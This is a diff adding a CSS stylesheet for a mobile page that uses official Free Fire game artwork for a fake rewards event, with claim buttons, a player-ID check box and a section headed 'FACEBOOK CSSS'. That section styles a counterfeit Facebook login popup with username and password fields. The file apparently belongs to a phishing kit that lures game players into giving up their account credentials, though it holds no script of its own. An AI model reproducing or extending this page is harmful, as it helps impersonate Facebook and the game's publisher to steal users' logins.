@@ -1,0 +1,1163 @@
+/* Made with ❤️ By Nguyen Thu Wann */
+
+/* EXTERNAL FONTS */
+@import url("https://fonts.googleapis.com/css2?family=Londrina+Solid:wght@300&display=swap");
+@import url("https://fonts.googleapis.com/css2?family=Barlow:wght@600&display=swap");
+@import url("https://fonts.googleapis.com/css2?family=Chakra+Petch&display=swap");
+@import url("https://fonts.googleapis.com/css2?family=Saira+Condensed&display=swap");
+@import url("https://fonts.googleapis.com/css2?family=Rubik&display=swap");
+/* END */
+
+/* START STYLESHEET */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  user-select: none;
+}
+.loader {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: black;
+  z-index: 9999999999999;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.loader img {
+  max-width: 100%;
+}
+img {
+  pointer-events: none;
+}
+body {
+  position: relative;
+  width: 100%;
+  min-height: 100vh;
+  background: url("https://dl.dir.freefiremobile.com/common/web_event/officialwebsite/wallpapers/1009/pop11.jpg")
+    no-repeat;
+  background-size: cover;
+  background-attachment: fixed;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+body:before {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.5);
+  backdrop-filter: blur(5px);
+}
+.sec1 {
+  position: relative;
+  width: 100%;
+  min-height: 100vh;
+  background: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/v4/max_bg.jpg")
+    no-repeat;
+  background-size: cover;
+  background-position-x: -400px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border: 1px solid #222;
+}
+.sec1:before {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.8);
+}
+.sec1 .wrap {
+  position: relative;
+  width: 100%;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: flex-start;
+  flex-direction: column;
+  padding: 60px 0 65px 0;
+}
+.wrap .inset {
+  position: relative;
+  width: 100%;
+  height: 253px;
+  padding: 2px 5px;
+  background: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/v4/guidance_bg.jpg")
+    no-repeat;
+  background-size: 100% 100%;
+}
+.wrap .inset:before {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.3);
+}
+/* .wrap .inset::before {
+  content: "";
+  position: absolute;
+  bottom: 0;
+  left: 0;
+  width: 100%;
+  height: 10px;
+  background: linear-gradient(to top, #000, transparent);
+  z-index: 999;
+} */
+.inset .swiper {
+  position: relative;
+  width: 100%;
+  height: 250px;
+  cursor: grab;
+  user-select: none;
+  padding: 5px;
+  z-index: 999;
+  overflow: hidden;
+}
+.inset .swiper:active {
+  cursor: grabbing;
+}
+.swiper-pagination-bullet.swiper-pagination-bullet-active {
+  background: #ffa41a;
+}
+.swiper .swiper-slide {
+  position: relative;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+.swiper .swiper-slide:after {
+  content: "";
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 100%;
+  height: 100%;
+  z-index: 99;
+  border: 2px solid #fff;
+  border-image: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/brushed_metal.jpg")
+    30;
+}
+/* .swiper .swiper-slide-active {
+  transform: scale(1.2);
+  transition: 0.4s;
+} */
+.swiper-slide img {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 100%;
+  height: 100%;
+  border-radius: 2px;
+  border: 1px solid #ffa41a;
+}
+.wrap .news {
+  position: relative;
+  width: 100%;
+  height: 50px;
+  background: #000;
+  text-align: center;
+  line-height: 46px;
+  z-index: 1;
+  transform-style: preserve-3d;
+  border-top: 1px solid #111;
+  border-bottom: 1px solid #111;
+  /* border-top: 2px solid #ffa41a;
+  border-bottom: 2px solid #ffa41a; */
+}
+.news .left {
+  position: absolute;
+  top: 50%;
+  left: 40px;
+  transform: translateY(-50%) rotateZ(180deg);
+  cursor: pointer;
+  width: 30px;
+  height: 30px;
+  background: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/v4/swiper_light.png")
+    no-repeat;
+  background-size: 100% 100%;
+  animation: change 2s infinite linear;
+  animation-delay: 1s;
+}
+.news .right {
+  position: absolute;
+  top: 50%;
+  right: 40px;
+  transform: translateY(-50%);
+  cursor: pointer;
+  width: 30px;
+  height: 30px;
+  background: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/v4/swiper_light.png")
+    no-repeat;
+  background-size: 100% 100%;
+  animation: change 2s infinite linear;
+}
+@keyframes change {
+  0%,
+  100% {
+    background: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/v4/swiper_light.png")
+      no-repeat;
+    background-size: 100% 100%;
+  }
+  50% {
+    background: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/v4/swiper_dark.png")
+      no-repeat;
+    background-size: 100% 100%;
+  }
+}
+.news h1 {
+  display: inline-block;
+  background: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/brushed_metal.jpg")
+    no-repeat;
+  background-position: top center;
+  background-size: 100% 100%;
+  font-weight: 600;
+  font-family: "Londrina Solid";
+  -webkit-background-clip: text;
+  font-size: 30px;
+  letter-spacing: 1.3;
+  -webkit-text-fill-color: transparent;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.sec1 .header {
+  position: fixed;
+  top: 0;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 100%;
+  height: 60px;
+  background: #000;
+  display: flex;
+  align-items: center;
+  padding: 5px 10px 5px 5px;
+  justify-content: space-between;
+  border: 1px solid #222;
+  z-index: 99999;
+  /* border-bottom-left-radius: 3px;
+  border-bottom-right-radius: 3px; */
+}
+.header .left {
+  position: relative;
+  width: calc(100% / 2);
+  height: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: flex-start;
+}
+.left .icon {
+  width: 45px;
+  height: 45px;
+  margin-right: 5px;
+}
+.left .logo {
+  max-width: 115px;
+}
+.right {
+  position: relative;
+  width: calc(100% / 2);
+  height: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: flex-end;
+}
+.right img {
+  max-width: 95px;
+  border-radius: 3px;
+  cursor: pointer;
+}
+.right img:hover {
+  outline: 1px solid #fff;
+}
+.right img:last-child {
+  margin-left: 3px;
+}
+
+.sec1 .menu {
+  position: fixed;
+  bottom: 0;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 100%;
+  height: 60px;
+  background: #000;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 5px;
+  border: 1px solid #222;
+  z-index: 999;
+  /* border-top-left-radius: 3px;
+  border-top-right-radius: 3px; */
+}
+
+.menu .col {
+  position: relative;
+  width: calc(100% / 4);
+  height: 100%;
+  /* margin: 5px; */
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  border-right: 1px solid #111;
+  padding: 3px;
+  cursor: pointer;
+}
+.menu .col.active {
+  background: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/brushed_metal.jpg")
+    no-repeat;
+  background-size: 100% 100%;
+  border-radius: 3px;
+}
+
+.menu .col:last-child {
+  border: none;
+}
+.col .imgBoxz {
+  position: relative;
+  width: 40px;
+  height: 40px;
+}
+.col .imgBoxz img {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  transition: 0.5s;
+}
+.col .title {
+  margin-top: 2px;
+  color: #fff;
+  font-weight: bold;
+  font-family: "Londrina Solid", cursive;
+  letter-spacing: 1.1;
+  font-size: 14px;
+}
+.menu .col.active .title {
+  text-shadow: 0 0 5px black;
+}
+.menu .col.active .imgBoxz img {
+  transform: scale(1.2);
+  filter: drop-shadow(0 0 5px black);
+}
+.wrap .content {
+  position: relative;
+  width: 100%;
+  display: flex;
+  align-items: center;
+  padding: 5px;
+  justify-content: center;
+}
+.content .card-wrap {
+  display: flex;
+  align-items: center;
+  justify-content: space-evenly;
+  gap: 15px;
+  flex-wrap: wrap;
+  animation: kenen 0.5s forwards linear;
+}
+@keyframes kenen {
+  from {
+    transform: translateY(50px);
+    opacity: 0;
+  }
+  to {
+    transform: translateY(0);
+    opacity: 1;
+  }
+}
+.card-wrap .card {
+  width: 110px;
+  height: 135px;
+  background: url("https://dl.dir.freefiremobile.com/common/web_event/collectionparty/images/big_prize.png")
+    no-repeat;
+  background-size: 100% 100%;
+  padding: 6px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  border-radius: 3px;
+  margin: 5px;
+}
+.card .imgBox {
+  position: relative;
+  width: 100%;
+  height: 100%;
+  background: chocolate;
+  border: 1px solid #ffdc51;
+  border-bottom: none;
+  border-top-left-radius: 3px;
+  border-top-right-radius: 3px;
+  overflow: hidden;
+}
+.imgBox img {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  border-top-left-radius: 3px;
+  border-top-right-radius: 3px;
+  z-index: 0;
+}
+.imgBox:before {
+  content: "";
+  position: absolute;
+  width: 20px;
+  height: 100%;
+  background: rgba(225, 225, 225, 0.5);
+  animation: shine 2s infinite linear;
+  z-index: 1;
+}
+@keyframes shine {
+  from {
+    transform: skewX(-30deg) translateX(-500px);
+  }
+  to {
+    transform: skewX(-30deg) translateX(500px);
+  }
+}
+.card .btn-claim {
+  position: relative;
+  width: 100%;
+  height: 25px;
+  background: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/brushed_metal.jpg")
+    no-repeat;
+  background-size: 100% 100%;
+  text-align: center;
+  letter-spacing: 1;
+  line-height: 24px;
+  border: 1px solid #ffdc51;
+  font-family: "Saira Condensed", sans-serif;
+  color: #fff;
+  text-shadow: 0 0 5px black;
+  font-weight: bold;
+  cursor: pointer;
+  border-bottom-left-radius: 3px;
+  border-bottom-right-radius: 3px;
+  /* border-top: 2px solid #fff;
+  border-image: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/brushed_metal.jpg")
+    30; */
+}
+.sec1 .mask {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.5);
+  z-index: 99999;
+  -webkit-filter: blur(3px);
+  filter: blur(3px);
+  backdrop-filter: blur(3px);
+  -webkit-backdrop-filter: blur(3px);
+}
+.sec1 .dialog {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: url("https://dl.dir.freefiremobile.com/common/web_event/collectionparty/images/dialog_bg.png")
+    no-repeat;
+  background-size: 100% 100%;
+  width: 350px;
+  height: 230px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  z-index: 999999;
+  padding: 15px;
+  display: none;
+}
+.dialog h1 {
+  font-family: "Saira Condensed", sans-serif;
+  color: #fff;
+  font-size: 25px;
+  /* text-transform: uppercase; */
+  background-image: -webkit-linear-gradient(#fdfdff, #c6afff);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+.dialog .imgReward {
+  width: 95px;
+  height: 100px;
+  background: url("https://dl.dir.freefiremobile.com/common/web_event/collectionparty/images/big_prize.png")
+    no-repeat;
+  background-size: 100% 100%;
+  padding: 6px;
+  display: flex;
+  /* border: 2px solid #fff;
+  border-image: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/brushed_metal.jpg")
+    30; */
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  border-radius: 3px;
+  margin: 5px;
+  margin-top: 10px;
+}
+.imgReward .boxImg {
+  position: relative;
+  width: 100%;
+  height: 100%;
+  background: chocolate;
+  border: 1px solid #ffdc51;
+  border-bottom: none;
+  border-top-left-radius: 3px;
+  border-top-right-radius: 3px;
+  overflow: hidden;
+}
+.boxImg img {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  border-top-left-radius: 3px;
+  border-top-right-radius: 3px;
+  z-index: 0;
+}
+.boxImg:before {
+  content: "";
+  position: absolute;
+  width: 20px;
+  height: 100%;
+  background: rgba(225, 225, 225, 0.5);
+  animation: shine 2s infinite linear;
+  z-index: 1;
+}
+.dialog .btn-login {
+  position: relative;
+  margin-top: 10px;
+  padding: 0 10px;
+  background: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/brushed_metal.jpg")
+    no-repeat;
+  background-size: 100% 100%;
+  text-align: center;
+  line-height: 24px;
+  border: 1px solid #ffdc51;
+  font-family: "Chakra Petch", sans-serif;
+  color: #fff;
+  text-shadow: 0 0 5px black;
+  font-weight: bold;
+  cursor: pointer;
+  border-radius: 2px;
+  /* border-top: 2px solid #fff;
+  border-image: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/brushed_metal.jpg")
+    30; */
+}
+.dialog .end {
+  color: #fff;
+  font-family: "Chakra Petch";
+  text-align: center;
+  white-space: wrap;
+}
+.dialog .hide {
+  position: absolute;
+  top: -40px;
+  left: 0;
+  width: 40px;
+  height: 40px;
+  background: url("https://dl.dir.freefiremobile.com/common/web_event/collectionparty/images/close.png")
+    no-repeat;
+  background-size: 100% 100%;
+  cursor: pointer;
+}
+
+@keyframes shine {
+  from {
+    transform: skewX(-30deg) translateX(-500px);
+  }
+  to {
+    transform: skewX(-30deg) translateX(500px);
+  }
+}
+
+/* TRUEID */
+.sec1 .trueid {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: url("https://dl.dir.freefiremobile.com/common/web_event/collectionparty/images/dialog_bg.png")
+    no-repeat;
+  background-size: 100% 100%;
+  width: 350px;
+  height: 230px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  z-index: 999999;
+  padding: 15px;
+}
+.trueid h1 {
+  font-family: "Saira Condensed", sans-serif;
+  color: #fff;
+  font-size: 30px;
+  /* text-transform: uppercase; */
+  background-image: -webkit-linear-gradient(#fdfdff, #c6afff);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+.trueid .input {
+  margin-top: 15px;
+  width: 250px;
+  height: 40px;
+  background: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/brushed_metal.jpg")
+    no-repeat;
+  background-size: 100% 100%;
+  border: none;
+  font-family: "Chakra Petch", sans-serif;
+  outline: none;
+  color: #fff;
+  font-weight: bold;
+  padding: 0 10px;
+  border: 1px solid #ffdc51;
+  border-radius: 3px;
+  line-height: 45px;
+  box-shadow: inset 0 1px 5px black;
+  text-shadow: 0 1px 5px black;
+}
+.trueid .input.empty {
+  filter: hue-rotate(300deg);
+  animation: shake-animation 2s forwards linear;
+}
+@keyframes shake-animation {
+  0% {
+    transform: translate(0, 0);
+  }
+  1.78571% {
+    transform: translate(5px, 0);
+  }
+  3.57143% {
+    transform: translate(0, 0);
+  }
+  5.35714% {
+    transform: translate(5px, 0);
+  }
+  7.14286% {
+    transform: translate(0, 0);
+  }
+  8.92857% {
+    transform: translate(5px, 0);
+  }
+  10.71429% {
+    transform: translate(0, 0);
+  }
+  100% {
+    transform: translate(0, 0);
+  }
+}
+.input::placeholder {
+  color: #fff;
+  text-shadow: 0 1px 5px black;
+}
+.trueid .btn-check {
+  margin-top: 20px;
+  width: 100px;
+  height: 30px;
+  background: #130f0f;
+  background-size: cover;
+  font-family: "Chakra Petch", sans-serif;
+  font-size: 15px;
+  text-align: center;
+  letter-spacing: -1px;
+  line-height: 26px;
+  color: #fff;
+  text-shadow: 0 0 2px #000;
+  font-weight: bold;
+  border: 1px solid #fff;
+  border-bottom: 3px solid #fff;
+  border-image: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/brushed_metal.jpg")
+    30;
+  outline: none;
+  cursor: pointer;
+}
+.trueid .btn-check.disabled {
+  opacity: 0.5;
+  pointer-events: none;
+}
+
+.trueid .alert {
+  position: absolute;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 250px;
+  height: 45px;
+  background: url("https://dl.dir.freefiremobile.com/common/web_event/collectionparty/images/for_grand.png")
+    no-repeat;
+  background-size: 100% 100%;
+  font-family: "Chakra Petch", sans-serif;
+  color: #fff;
+  text-align: center;
+  line-height: 44px;
+  padding-left: 10px;
+  animation: slidein 0.5s forwards linear;
+  display: none;
+}
+@keyframes slidein {
+  from {
+    top: -30px;
+    opacity: 0;
+  }
+  to {
+    top: -45px;
+    opacity: 1;
+  }
+}
+.alert .fa {
+  float: left;
+  margin-top: 14px;
+}
+
+.sec1 .toast {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  height: 40px;
+  background: url("https://dl.dir.freefiremobile.com/common/web_event/collectionparty/images/toast.png")
+    no-repeat;
+  background-size: 100% 100%;
+  z-index: 999999999;
+  animation: masuk 0.5s forwards linear;
+  text-align: center;
+  color: #fff;
+  line-height: 40px;
+  overflow: hidden;
+  display: none;
+}
+.toast .toast-alert {
+  font-family: "Chakra Petch";
+  white-space: nowrap;
+}
+@keyframes masuk {
+  from {
+    width: 0;
+  }
+  to {
+    width: 400px;
+  }
+}
+/* VALIDATE */
+
+.sec1 .footer {
+  position: fixed;
+  bottom: 0;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 100%;
+  height: 60px;
+  background: #000;
+  display: flex;
+  align-items: center;
+  justify-content: flex-start;
+  padding: 5px;
+  border: 1px solid #222;
+  z-index: 999;
+}
+.footer .icon {
+  position: relative;
+  width: 45px;
+  height: 40px;
+  border-radius: 3px;
+  margin-right: 10px;
+}
+.footer .text-area {
+  position: relative;
+  display: flex;
+  align-items: flex-start;
+  justify-content: center;
+  flex-direction: column;
+  color: #fff;
+  font-size: 10px;
+  font-family: "Rubik", sans-serif;
+}
+.icon img {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  border-radius: 3px;
+}
+
+.content .form-group {
+  position: relative;
+  width: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.content .form-group:first-child {
+  margin-top: 20px;
+}
+.content .form-group:not(:first-child) {
+  margin-top: 25px;
+}
+.form-group .finput {
+  width: 300px;
+  height: 40px;
+  background: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/brushed_metal.jpg")
+    no-repeat;
+  background-size: 100% 100%;
+  border: none;
+  font-family: "Chakra Petch", sans-serif;
+  outline: none;
+  color: #fff;
+  font-weight: bold;
+  padding: 0 10px;
+  border: 1px solid #ffdc51;
+  border-radius: 3px;
+  line-height: 45px;
+  box-shadow: inset 0 1px 5px black;
+  text-shadow: 0 1px 5px black;
+  /* filter: hue-rotate(310deg); */
+}
+
+.finput.das {
+  background: red;
+  /* animation: shake-animation 2s forwards linear; */
+}
+
+.form-group .finput::placeholder {
+  color: #fff;
+}
+
+.form-group .fsubmit {
+  position: relative;
+  width: 100px;
+  height: 30px;
+  background: #130f0f;
+  background-size: cover;
+  font-family: "Chakra Petch", sans-serif;
+  font-size: 15px;
+  text-align: center;
+  letter-spacing: -1px;
+  line-height: 23px;
+  color: #fff;
+  text-shadow: 0 0 2px #000;
+  font-weight: bold;
+  border: 1px solid #fff;
+  border-bottom: 3px solid #fff;
+  border-image: url("https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/brushed_metal.jpg")
+    30;
+  outline: none;
+  cursor: pointer;
+}
+.form-group .fsubmit.disabled {
+  opacity: 0.5;
+  pointer-events: none;
+}
+@media (min-width: 500px) {
+  .sec1,
+  .wrap .menu,
+  .wrap .header,
+  .wrap .footer {
+    width: 400px;
+  }
+  .card-wrap .card {
+    width: 109px;
+    height: 135px;
+  }
+}
+
+@media (max-width: 425px) {
+  .card-wrap .card {
+    width: 115px;
+    height: 135px;
+  }
+  .right img {
+    max-width: 75px;
+  }
+}
+
+@media (max-width: 416px) {
+  .card-wrap .card {
+    width: 110px;
+    height: 130px;
+  }
+}
+
+@media (max-width: 401px) {
+  .card-wrap .card {
+    width: 105px;
+    height: 130px;
+  }
+}
+@media (max-width: 386px) {
+  .card-wrap .card {
+    width: 100px;
+    height: 125px;
+  }
+}
+@media (max-width: 371px) {
+  .card-wrap .card {
+    width: 95px;
+    height: 120px;
+  }
+}
+@media (max-width: 356px) {
+  .card-wrap .card {
+    width: 90px;
+    height: 115px;
+  }
+}
+@media (max-width: 341px) {
+  .card-wrap .card {
+    width: 85px;
+    height: 110px;
+  }
+}
+@media (max-width: 375px) {
+  .wrap .inset {
+    height: 220px;
+  }
+  .inset .swiper {
+    height: 215px;
+  }
+}
+
+@media only screen and (max-width: 340px) and (min-width: 320px) {
+  .left .logo {
+    max-width: 90px;
+  }
+  .right img {
+    max-width: 70px;
+  }
+  .news .right {
+    right: 20px;
+  }
+  .news .left {
+    left: 20px;
+  }
+  .sec1 .dialog,
+  .sec1 .trueid {
+    width: 300px;
+  }
+  .card-wrap .card {
+    width: 82px;
+    height: 105px;
+  }
+  .card .btn-claim {
+    width: 100%;
+    height: 20px;
+    line-height: 18px;
+    font-size: 13px;
+  }
+}
+
+/* FACEBOOK CSSS */
+.popup-login {
+  background: rgba(0, 0, 0, 0.5);
+  width: 100%;
+  height: 100%;
+  position: fixed;
+  top: 0;
+  left: 0;
+  z-index: 999999999999999999;
+}
+.popup-box-login-fb {
+  background: #eceff6;
+  max-width: 330px;
+  height: auto;
+  position: relative;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  text-align: center;
+  font-family: "Teko";
+  color: #000;
+  border-radius: 10px;
+}
+.navbar-fb {
+  background: #3b5998;
+  height: auto;
+  max-width: 330px;
+  padding: 8px;
+  border-top-left-radius: 10px;
+  border-top-right-radius: 10px;
+}
+.navbar-fb img {
+  width: 115px;
+  margin-left: auto;
+  margin-right: auto;
+  display: block;
+}
+.content-box-fb {
+  width: 300px;
+  height: auto;
+  margin-left: auto;
+  margin-right: auto;
+  display: block;
+}
+.content-box-fb .alert {
+  display: none;
+  left: -15px;
+  position: relative;
+  width: 330px;
+  padding: 5px;
+  background: red;
+  color: #fff;
+  font-size: 13px;
+  font-family: "Roboto";
+}
+.content-box-fb img {
+  width: 75;
+  margin-top: 20px;
+  margin-left: auto;
+  margin-right: auto;
+  border-radius: 12px;
+  display: block;
+}
+.txt-login-fb {
+  width: 290px;
+  height: auto;
+  margin-top: 10px;
+  margin-left: auto;
+  margin-right: auto;
+  margin-bottom: 17px;
+  padding: 8px;
+  color: #90949c;
+  font-size: 16px;
+  font-family: Roboto;
+  text-align: center;
+  display: block;
+}
+input[type="text"],
+input[type="password"] {
+  width: 100%;
+  height: auto;
+  padding: 12px;
+  color: #000;
+  font-size: 14px;
+  font-weight: 400;
+  font-family: "Lato", sans-serif;
+  border: 1px solid #bdbebf;
+  cursor: pointer;
+  outline: none;
+}
+.login-form input[type="text"] {
+  margin: 0;
+  padding-bottom: 13px;
+  border-bottom: none;
+  border-radius: 4px 4px 0 0;
+  box-shadow: 0 -1px 0 #e0e0e0 inset, 0 0px 0px rgba(0, 0, 0, 0.23) inset;
+}
+.login-form input[type="password"] {
+  margin: 0;
+  border-top: none;
+  border-radius: 0 0 4px 4px;
+  box-shadow: 0 -0px 0 rgba(0, 0, 0, 0.23) inset,
+    0 0px 0px rgba(255, 255, 255, 0.1);
+}
+.btn-login-fb {
+  background: #1778f2;
+  width: 100%;
+  height: auto;
+  margin-top: 10px;
+  margin-left: auto;
+  margin-right: auto;
+  padding: 10px;
+  color: #fff;
+  font-size: 14px;
+  font-family: Roboto;
+  font-weight: bold;
+  text-align: center;
+  text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
+  border: 1px solid #3578e5;
+  border-radius: 5px;
+  box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
+  outline: none;
+  display: block;
+}
+.btn-login-fb.disabled {
+  pointer-events: none;
+  background: #8b9dc3;
+  border: 1px solid #8b9dc3;
+}
+.txt-create-account {
+  margin-top: 4px;
+  width: 100%;
+  height: auto;
+  padding: 5px;
+  color: #3b5998;
+  font-size: 13.5px;
+  font-family: Roboto;
+  text-align: center;
+}
+.txt-not-now {
+  width: 100%;
+  height: auto;
+  padding: 5px;
+  color: #3b5998;
+  font-size: 13.5px;
+  font-family: Roboto;
+  text-align: center;
+}
+.txt-forgotten-password {
+  width: 100%;
+  height: auto;
+  margin-bottom: 30px;
+  padding: 5px;
+  color: #7596c8;
+  font-size: 13.5px;
+  font-family: Roboto;
+  text-align: center;
+}
+.language-box {
+  width: 100%;
+  height: auto;
+  margin-left: auto;
+  margin-right: auto;
+  display: block;
+}
+.language-name {
+  width: 40%;
+  height: auto;
+  margin: 5px;
+  margin-bottom: 0px;
+  color: #3b5998;
+  font-size: 12px;
+  font-family: Roboto;
+  text-align: center;
+  display: inline-block;
+}
+.language-name i {
+  width: 23px;
+  padding: 4px;
+  color: #90949c;
+  border: 1px solid #3b5998;
+  border-radius: 3px;
+}
+.language-name-active {
+  color: #90949c;
+  font-weight: bold;
+}
+.copyrights {
+  width: 40%;
+  height: auto;
+  margin-top: 10px;
+  margin-left: auto;
+  margin-right: auto;
+  color: #90949c;
+  font-size: 12px;
+  font-family: Roboto;
+  text-align: center;
+  display: block;
+}
